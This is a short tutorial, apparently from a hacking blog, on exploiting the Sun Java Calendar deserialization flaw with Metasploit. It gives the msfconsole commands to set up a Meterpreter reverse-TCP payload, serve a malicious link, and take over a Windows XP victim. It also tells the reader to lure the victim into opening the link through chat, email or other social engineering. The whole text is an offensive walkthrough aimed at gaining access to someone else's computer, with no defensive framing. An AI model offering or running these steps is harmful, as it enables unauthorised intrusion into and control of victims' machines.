Hack Remote Windows PC using Sun Java Calendar Deserialization Privilege Escalation

This module exploits a flaw in the deserialization of Calendar objects in the Sun JVM. The payload can be either a native payload which is generated as an executable and dropped/executed on the target or a shell from within the Java applet in the target browser. The affected Java versions are JDK and JRE 6 Update 10 and earlier, JDK and JRE 5.0 Update 16 and earlier, SDK and JRE 1.4.2_18 and earlier (SDK and JRE 1.3.1 are not affected).
0 – Generic (Java Payload) (default)
1 – Windows x86 (Native Payload)
2 – Mac OS X PPC (Native Payload)
3 – Mac OS X x86 (Native Payload)
4 – Linux x86 (Native Payload)
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/browser/java_calendar_deserialize
Msf exploit (java_calendar_deserialize)>set payload java/meterpreter/reverse_tcp
Msf exploit (java_calendar_deserialize)>set lhost 192.168.1.4 (IP of Local Host)
Msf exploit (java_calendar_deserialize)>set srvhost 192.168.1.4 (This must be an address on the local machine)
Msf exploit (java_calendar_deserialize)>set uripath javacalendar (The Url to use for this exploit)
Msf exploit (java_calendar_deserialize)>exploit

Now an URL you should give to your victim http://192.168.1.4:8080/javacalendar

Send the link of the server to the victim via chat or email or any social engineering technique.
Now you have access to the victims PC. Use “Sessions -l” and the Session number to connect to the session. And Now Type “sessions -i ID“
